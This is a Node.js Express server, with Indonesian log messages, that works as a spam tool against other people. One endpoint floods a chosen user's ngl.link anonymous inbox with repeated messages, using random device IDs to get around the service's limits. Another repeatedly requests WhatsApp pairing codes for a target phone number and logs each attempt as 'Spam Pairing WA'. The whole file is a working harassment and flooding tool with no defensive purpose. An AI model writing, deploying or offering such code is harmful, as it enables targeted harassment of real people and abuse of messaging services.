import express from "express";
import fs from "fs";
import path from "path";
import rateLimit from "express-rate-limit";
import crypto from "crypto";
import fetch from "node-fetch";
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { makeWASocket,  useMultiFileAuthState } from "@whiskeysockets/baileys";
import pino from "pino";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const app = express();
const PORT = process.env.PORT || 3000;

// Rate limiter
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  message: "Terlalu banyak permintaan, coba lagi nanti."
});

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(limiter);

app.use(express.static(path.join(__dirname, "views")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

app.post("/ngl", async (req, res) => {
  const { username, message, count } = req.body;
  let counter = 0;
  let log = "";

  async function sendMessage() {
    const deviceId = crypto.randomBytes(21).toString("hex");
    const response = await fetch("https://ngl.link/api/submit", {
      method: "POST",
      headers: {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        Referer: `https://ngl.link/${username}`,
        Origin: "https://ngl.link",
      },
      body: `username=${username}&question=${message}&deviceId=${deviceId}`,
    });
    return response.status === 200;
  }

  for (let i = 0; i < parseInt(count); i++) {
    const success = await sendMessage();
    const time = new Date().toLocaleTimeString();
    log += success ? `[${time}] Sukses kirim #${i + 1}\n` : `[${time}] Gagal kirim #${i + 1}\n`;
  }

  res.json({ log });
});

app.post("/wa", async (req, res) => {
  const usePairing = true
  const { number, count } = req.body;
  const { state } = await useMultiFileAuthState('./session');
  const sock = makeWASocket({ 
      logger: pino({ level: 'silent' }),
      auth: state,
      printQRInTerminal: !usePairing,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version: [2, 3000, 1023223821], 
    });
  let log = "";

  for (let i = 0; i < parseInt(count); i++) {
    try {
      let code = await sock.requestPairingCode(number);
      const time = new Date().toLocaleTimeString();
      log += `[${time}] Sukses Spam Pairing WA #${i + 1}\n`;
    } catch (err) {
      const time = new Date().toLocaleTimeString();
      log += `[${time}] Gagal Spam Pairing WA #${i + 1}: ${err.message}\n`;
    }
  }

  res.json({ log });
});

app.listen(PORT, () => console.log("Server ready on http://localhost:" + PORT));